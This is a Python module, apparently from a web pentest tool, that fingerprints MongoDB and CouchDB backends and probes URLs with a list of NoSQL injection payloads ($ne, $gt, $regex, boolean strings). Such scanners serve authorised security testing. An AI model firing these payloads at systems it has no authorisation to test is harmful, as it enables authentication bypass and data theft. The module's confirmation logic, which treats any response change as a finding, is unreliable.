"""
Injecta — NoSQL injection detection & exploitation (MongoDB, CouchDB, etc.)
"""
import json
import re
from typing import Dict, List, Optional, Any


NOSQL_SIGNATURES = {
    "mongodb": {
        "headers": [],
        "body": [r"mongodb", r"mongo", r"ObjectId\(.*\)", r"ISODate\(.*\)"],
        "ports": [27017],
        "url_hints": ["/api/", "/v1/", "/graphql", "/rest/"],
    },
    "couchdb": {
        "headers": ["x-couchdb", "server: couchdb"],
        "body": [r"couchdb", r"\"ok\": true"],
        "ports": [5984],
        "url_hints": [],
    },
}

NOSQL_PAYLOADS = [
    # JSON-based $ne injection
    ('{"$ne": null}', "mongodb"),
    ('{"$gt": ""}', "mongodb"),
    ('{"$regex": ".*"}', "mongodb"),
    ('{"$ne": 1}', "mongodb"),
    ('[$ne]=1', "mongodb"),
    # URL-encoded variants
    ("[$ne]=1", "mongodb"),
    ("[$gt]=", "mongodb"),
    ("[$regex]=.*", "mongodb"),
    # Boolean-based
    ("' && 1 && '1'=='1", "mongodb"),
    ("' && 1 && '1'=='2", "mongodb"),
    # CouchDB
    ('"$ne":null', "couchdb"),
    ('"$gt":""', "couchdb"),
]


class NoSQLDetector:
    def __init__(self, requester, config, logger):
        self.req = requester
        self.config = config
        self.log = logger
        self.detected = False
        self.db_type = None

    def scan(self, url: str) -> Dict[str, Any]:
        self.log.info("Checking for NoSQL endpoints...")

        for db_name, sig in NOSQL_SIGNATURES.items():
            for hint in sig.get("url_hints", []):
                if hint in url.lower():
                    self.detected = True
                    self.db_type = db_name
                    self.log.info(f"NoSQL hint in URL ({hint}) — probing {db_name}")
                    return self._probe(url)

        resp, err = self.req.request(url)
        if err or resp is None:
            return {"detected": False, "db_type": None}

        body = resp.text.lower() if resp.text else ""
        headers = {k.lower(): v for k, v in resp.headers.items()} if resp.headers else {}

        for db_name, sig in NOSQL_SIGNATURES.items():
            for h_pattern in sig.get("headers", []):
                hp = h_pattern.lower()
                for hk, hv in headers.items():
                    if hp in hk or hp in hv:
                        self.detected = True
                        self.db_type = db_name
                        return self._probe(url)

            for b_pattern in sig.get("body", []):
                if re.search(b_pattern, body, re.IGNORECASE):
                    self.detected = True
                    self.db_type = db_name
                    return self._probe(url)

        return {"detected": self.detected, "db_type": self.db_type}

    def _probe(self, url: str) -> Dict[str, Any]:
        resp, err = self.req.request(url)
        if err or resp is None:
            return {"detected": False, "db_type": None, "vulnerable": False}

        baseline = resp.text
        vulnerable = False

        for payload_str, dbms in NOSQL_PAYLOADS:
            injected_url, injected_data = self._inject_nosql(url, payload_str)
            resp2, err2 = self.req.request(injected_url, data=injected_data)
            if err2 or resp2 is None:
                continue
            if self._detectable_difference(baseline, resp2.text):
                vulnerable = True
                self.log.ok(f"NoSQL injection confirmed ({dbms}): {payload_str}")
                break

        return {
            "detected": self.detected,
            "db_type": self.db_type or "unknown",
            "vulnerable": vulnerable,
        }

    def _inject_nosql(self, url: str, payload_str: str) -> tuple:
        if "?" in url and self.config.method == "GET":
            base, qs = url.split("?", 1)
            import urllib.parse
            params = urllib.parse.parse_qs(qs)
            first_key = list(params.keys())[0] if params else "id"
            params[first_key] = [payload_str]
            new_qs = urllib.parse.urlencode(params, doseq=True)
            return (f"{base}?{new_qs}", None)
        return (url, payload_str)

    def _detectable_difference(self, baseline: str, response: str) -> bool:
        if not baseline or not response:
            return False
        len_diff = abs(len(response) - len(baseline))
        if len_diff > 10 and len_diff > len(baseline) * 0.03:
            return True
        if baseline != response and len_diff > 0:
            return True
        return False

    def is_nosql(self) -> bool:
        return self.detected
